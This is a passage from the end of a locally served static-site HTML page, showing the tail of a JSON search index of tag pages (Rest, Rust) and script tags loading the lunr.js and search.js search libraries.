        "title": "Rest",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/rest\/"
    },
    
    "http:\/\/localhost:1313\/tags\/rust\/": {
        "title": "Rust",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/rust\/"
    },
    
}
</script>


    <script defer src="/js/lunr.js"></script>
    <script defer src="/js/search.js"></script>


</footer>

</body>
</html>

